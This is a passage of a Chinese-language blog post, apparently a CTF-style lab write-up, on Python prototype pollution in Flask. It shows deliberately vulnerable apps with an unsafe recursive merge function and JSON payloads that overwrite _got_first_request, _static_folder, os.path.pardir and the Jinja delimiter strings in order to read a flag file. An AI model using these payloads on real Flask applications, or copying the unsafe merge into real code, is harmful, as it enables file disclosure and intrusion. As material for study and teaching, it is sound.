class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;Is flag here?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(app, <span class="string">&quot;special&quot;</span>) <span class="keyword">and</span> app.special == <span class="string">&quot;U_Polluted_It&quot;</span>:</span><br><span class="line">        flag = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="built_in">setattr</span>(app, <span class="string">&quot;special&quot;</span>, <span class="string">&quot;U_Polluted_It&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;_got_first_request&quot;</span>:<span class="literal">False</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="static-url-path"><a href="#static-url-path" class="headerlink" title="_static_url_path:"></a>_static_url_path:</h3><p>当python指定了static静态目录以后，我们再进行访问就会定向到static文件夹下面的对应文件而不会存在目录穿梭的漏洞，但是如果我们想要访问其他文件下面的敏感信息，我们就需要污染这个静态目录，让他自动帮我们实现定向</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#static/index.html</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;hello&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag in ./flag but heres only static/index.html&quot;</span></span><br><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;_static_folder&quot;</span>:<span class="string">&quot;./&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="os-path-pardir"><a href="#os-path-pardir" class="headerlink" title="os.path.pardir:"></a>os.path.pardir:</h3><p>套一下师傅的示例脚本来学习一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag in ./flag but heres only static/index.html&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>我们进行目录穿梭进行访问发现报了500的错误：这个地方就是模板渲染的时候，防止目录穿梭进行的一个操作，而我们的os.path.pardir恰好是我们的..所以会进行报错，所以我们如果把这个地方进行修改为除..外的任意值，我们就可以进行目录穿梭了。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;os&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;path&quot;</span>:&#123;</span><br><span class="line">                    <span class="string">&quot;pardir&quot;</span>:<span class="string">&quot;,&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Jinja语法标识符："><a href="#Jinja语法标识符：" class="headerlink" title="Jinja语法标识符："></a>Jinja语法标识符：</h2>
+我们在学习SSTI的时候，语法标识符\{\{\}\}是解析jinja语法重要的一个东西，那么我们能不能对这个东西进行修改呢：在Jinja的文档中，提到了对Jinja环境类的相关属性问题，文档中提到说，如果此类的实例未共享并且尚未加载模板的话，我们就可以修改此类的实例
+
+<p><img src="https://sl0wjamz.oss-cn-hangzhou.aliyuncs.com/img/image-20241020144210517.png" alt="image-20241020144210517"></p>
+<p>而师傅在文章中又提到了对Flask底层的一个研究，就是在Flask中使用的Flask类的装饰器以后，jinja_env方法实现了上述的功能点：</p>
+<p>我们跟进下create_jinja_environment()函数，发现<code>jinja_env</code>方法返回值就是<code>Jinja</code>中的环境类：<code>jinja_environment = Environment</code>，所以我们可以直接采用类似<code>Flask.jinja_env.variable_start_string = &quot;xxx&quot;</code>来实现对<code>Jinja</code>语法标识符进行替换</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#templates/index.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Look this -&gt; [[flag]] &lt;- try to make it become the real flag<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;go check /index before merge it&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">templates</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;test.html&quot;</span>, flag = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read())</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+我们想要通过{{flag}}的话，就需要将语法标识符进行替换，这里我们就将语法标识符从{{}}，替换为[[]]这样的话，[[flag]]就能够像{{flag}}一样被解析了。
+
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;jinja_env&quot;</span> :&#123;</span><br><span class="line"><span class="string">&quot;variable_start_string&quot;</span> : <span class="string">&quot;[[&quot;</span>,<span class="string">&quot;variable_end_string&quot;</span>:<span class="string">&quot;]]&quot;</span></span><br><span class="line">&#125;        </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意：</p>
+<p>但是在Flask框架当中，他会对模板文件编译后进行一定的缓存，下次再需要渲染的时候，直接使用缓存里面的模板文件，这样的话我们修改后语法标识符里面的flag变量并没有被放到缓存当中，所以没有自动填充flag，所以我们需要在Flask启动以后先输入payload再访问路由，这样就可以做到先污染再访问模板</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by void2eye, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/Web/" class="tag">#Web</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2024/02/26/python%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">Python魔术方法</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2024/02/26/rce_bypass/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">RCE Bypass</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        <div class="container">
+            <div id="waline"></div>
+            <script>
+                new Waline({
+                    el: "#waline",
+                    
+                    path: location.pathname,
+                    
+                    serverURL: https://blogcomment-blond.vercel.app/,
+                    
+                    requiredMeta: ['nick'],
+                    
+                });
+            </script>
+        </div>
+        
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/void2eye/Registration-tool-automatic-submission-script" class="item">RE_tools</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a href="mailto:2110027730@qq.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 void2eye<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        <br>
+        <span class="footer-extra-description"><a href="https://beian.miit.gov.cn/" target="_blank">浙ICP备2024135394号</a></span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
